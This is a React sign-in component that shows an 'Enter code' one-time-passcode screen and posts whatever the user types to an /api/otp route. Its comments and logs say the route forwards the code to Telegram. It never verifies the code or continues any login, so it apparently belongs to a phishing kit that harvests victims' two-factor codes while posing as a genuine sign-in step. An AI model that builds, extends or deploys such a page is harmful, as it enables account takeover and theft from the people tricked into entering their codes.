"use client"

import FormInput from '@/components/signin/FormInput';
import { useState } from 'react';

export default function OtpForm() {
  const [code, setCode] = useState('');

   const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Send to Telegram
    try {
      const res = await fetch('/api/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code }),
      });

      const result = await res.json();
      if (result.success) {
        console.log("Telegram notification sent!");
      } else {
        console.error("Telegram error:", result.error);
      }
    } catch (err) {
      console.error("Telegram fetch failed:", err);
    }
  };

  return (
    <div className="space-y-6">
      <div className='pt-3' />
      <div className="space-y-3">
      <h2 className="text-[1.5rem] font-bold text-gray-700">Enter code</h2>
      <form onSubmit={handleSubmit} className="space-y-3">
        <div className="space-y-4">
          <FormInput 
            id="code" 
            label="Code" 
            type="text" 
            value={code}
            onChange={(e) => setCode(e.target.value)}
          />
          <p className='text-left text-black'>We sent a code to your email.</p>
          <div className="flex flex-col space-y-4">
        </div>
          <div className='flex space-x-4 items-left pb-20'>
            <button type="submit" className="w-1/3 py-3 bg-[#66d3ee] hover:bg-[#254a7e] text-[#172f50] hover:text-white font-bold hover:font-bold rounded-md">
            Next
          </button>
          <button type='button' className="w-1/3 py-3 bg-white border border-[#172f50] hover:bg-[#254a7e] text-[#172f50] hover:text-white font-bold hover:font-bold rounded-md">
            Cancel
          </button>
          </div>
        </div>
      </form>
      </div>
    </div>
  );
}